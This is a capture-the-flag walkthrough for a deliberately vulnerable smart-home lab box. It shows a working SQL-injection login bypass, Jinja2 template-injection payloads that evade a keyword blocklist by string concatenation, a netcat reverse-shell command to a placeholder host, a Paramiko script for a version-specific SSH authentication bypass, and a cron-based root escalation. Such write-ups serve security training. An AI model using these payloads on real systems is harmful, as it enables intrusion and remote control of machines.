# SmartHome: Boot2Root — Walkthrough

*Difficulty: Medium–Hard | Flags: user.txt, root.txt*

---

## Overview

This box simulates a smart-home management portal exposed over HTTP, backed by SQLite, rendering templates with Jinja2, and offering SSH access on a non-standard port. The path to root runs through a classic SQL injection, a filtered Server-Side Template Injection, an SSH authentication-bypass bug tied to a specific musl/OpenSSH build, and a world-writable cron job.

```
Recon → SQLi login bypass → Admin dashboard → Filtered SSTI → RCE
      → SSH auth bypass → user.txt → Writable cron → root.txt
```

---

## Stage 1 — Reconnaissance

A port scan turns up two services of interest:

| Port | Service | Notes |
|------|---------|-------|
| 5000 | HTTP | SmartHome Portal login page |
| 2222 | SSH  | OpenSSH 9.0p1, version visible in banner |

Browsing the web app, two details stand out immediately:

- An `X-Powered-By: Jinja2/3.1` response header
- A page comment confirming the templating engine

Later, once inside the admin dashboard, a **System Status** page explicitly flags OpenSSH 9.0p1 as a "legacy build" — a clue that pays off in Stage 4.

---

## Stage 2 — SQL Injection Login Bypass

The `/login` route builds its query with raw f-string interpolation rather than parameterized queries:

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

Submitting the following credentials:

| Field | Value |
|-------|-------|
| Username | `admin'--` |
| Password | *(anything)* |

comments out the password check entirely:

```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
```

The query now returns the admin row unconditionally, granting an authenticated admin session.


> **Decoy note:** the device search endpoint carries a `# TODO: fix SQL injection in device search` comment sitting above a properly parameterized query — a red herring meant to send players chasing the wrong field.

---

## Stage 3 — Filtered SSTI → Remote Code Execution

### The filter

The temperature update endpoint (`/devices/<id>/temperature`) layers two defenses on top of user input:

1. A numeric check anchored only at the start of the string:
   ```python
   re.match(r'^-?\d+', value)
   ```
   Any value beginning with digits — e.g. `22{%...%}` — passes.

2. A case-insensitive keyword blocklist scanning the **raw** payload for strings like `{{`, `__class__`, `__globals__`, `popen`, `system`, `import`, `config`, and others.

Because the blocklist runs before template compilation, two things follow:

- `{{ }}` expression syntax is off-limits — everything must be done with `{% %}` statement blocks.
- Any blocked substring anywhere in the payload (even inside a filename like `sshd_config`) trips the filter.

### The bypass

The key insight is that `get_flashed_messages` — a default Jinja2 context builtin — is **not** on the blocklist, and its `__globals__` dict exposes Python's loaded modules, including `os`. Combined with string concatenation (`~`), every blocked keyword can be assembled at render time from harmless fragments, so nothing blocked ever appears literally in the request.

**Step 1 — Proof of concept:**

```jinja2
22{%if (7*7)==49%}SSTI_PROOF_49{%endif%}
```

**Step 2 — Reaching `os.popen`:**

```jinja2
22{%set gfm=get_flashed_messages%}
{%set gg="__glo"~"bals__"%}
{%set gl=gfm|attr(gg)%}
{%set os=gl["os"]%}
{%set pp="po"~"pen"%}
```

With `os` and `pp` ("popen") resolved via concatenation, arbitrary shell commands become reachable without a single blocked keyword appearing in the request body.

**Confirming the chain**, in order:

| Check | Payload fragment | Result |
|---|---|---|
| Automation user exists | `cat /etc/passwd`, test for `"automation"` | `USER_FOUND` ✅ |
| Running user | `id`, test for `"root"` | `NOTROOT` (runs as `www-data`) |
| Password auth enabled | split filename `sshd_con` ~ `fig` | `PASSAUTH_YES` ✅ |
| SSH version | `ssh -V 2>&1` | `OPENSSH_CONFIRMED` ✅ |

### Reading command output

Since `{{ }}` can't be used to print output directly, and `websvc` has write access to `/app/static/`, output is redirected to a static file and fetched separately:

```jinja2
22{%set gfm=get_flashed_messages%}{%set gg="__glo"~"bals__"%}{%set gl=gfm|attr(gg)%}{%set os=gl["os"]%}{%set pp="po"~"pen"%}{%set _=os|attr(pp)("ls -la /app > /app/static/out.txt")|attr("read")()%}DONE
```

```bash
curl http://target:5000/static/out.txt
```

This same technique recovers `/etc/passwd` (revealing the `automation` service account) and `/etc/ssh/sshd_config` (confirming `PasswordAuthentication yes`) — note the filename is split across variables since `config` is itself a blocked substring.

### Interactive shell

With `/usr/bin/nc` present on the host, a reverse shell closes out this stage:

```bash
nc -lvnp 4444
```

```jinja2
22{%set gfm=get_flashed_messages%}{%set gg="__glo"~"bals__"%}{%set gl=gfm|attr(gg)%}{%set os=gl["os"]%}{%set pp="po"~"pen"%}{%set _=os|attr(pp)("nc YOUR_IP 4444 -e /bin/sh")|attr("read")()%}DONE
```

Resulting shell: **`websvc`, uid=1002**.

---

## Stage 4 — SSHOLE: SSH Authentication Bypass

### Mechanism

The target runs **Alpine Linux 3.16** (musl libc) with **OpenSSH 9.0p1-r5**. Submitting an oversized password (300 bytes) against a locked account (shadow field `*`, as `automation` is) triggers a fault in musl's authentication state handling. Retrying the same oversized password within the **same SSH transport connection** then completes authentication without a valid password ever being required.

**Preconditions for this to work:**
- sshd linked against musl, not glibc (no PAM)
- OpenSSH 9.0p1-r5 specifically (Alpine's r6 backported the fix)
- Target account's shadow entry is `*` (locked)
- `PasswordAuthentication yes` in `sshd_config`

### Exploit — Paramiko

```python
import paramiko

trans = paramiko.Transport(("127.0.0.1", 2222))
trans.connect()

pwd = "A" * 300
for attempt in range(1, 4):
    try:
        trans.auth_password("automation", pwd)
        print("Logged in as automation!")
        break
    except paramiko.AuthenticationException:
        pass

chan = trans.open_session()
chan.exec_command("id")
print(chan.makefile("r").read())  # uid=1000(automation)
```

### Exploit — SSH CLI

```bash
python3 -c 'print("A"*300)' | xclip -selection clipboard
ssh -p 2222 automation@127.0.0.1
# Paste the 300-char string when prompted — twice, across two prompts
```

---

## Stage 5 — user.txt

```bash
cat /home/automation/user.txt
```

---

## Stage 6 — Privilege Escalation via Cron

The admin dashboard's System Status page reveals a root cron job:

```
* * * * *  /opt/maintenance.sh
```

`/opt/maintenance.sh` is world-writable (`777`), so overwriting it with a payload gets executed as root on the next minute boundary:

```bash
printf '#!/bin/sh\ncp /root/root.txt /tmp/r.txt\nchmod 644 /tmp/r.txt\n' > /opt/maintenance.sh
sleep 60
cat /tmp/r.txt
```

---

## Clue & Decoy Reference

**Clues that point forward:**

| Location | What it hints at |
|---|---|
| `X-Powered-By: Jinja2/3.1` header | SSTI |
| Login page HTML comment | SSTI |
| Device named "Automation Hub" | SSH username |
| Activity log entry re: automation service account | SSH username |
| "Legacy OpenSSH build" note + version 9.0p1 | Version-specific SSH exploit |
| Cron entry shown on dashboard | Privesc target |

**Decoys (intentional dead ends):**

| Location | Why it misleads |
|---|---|
| Device search comment | Points at a *safe*, parameterized query |
| `/api/debug` endpoint | Fake config JSON, no real secrets |
| `guest` account | Valid login, no privilege path |
| Garage Camera firmware version | Looks like a CVE rabbit hole, isn't exploitable |

---

## Verification

```bash
make verify
# or
python3 scripts/verify_chain.py
```

Expected: all 6 stages reported **PASS**, with no flag values printed to stdout.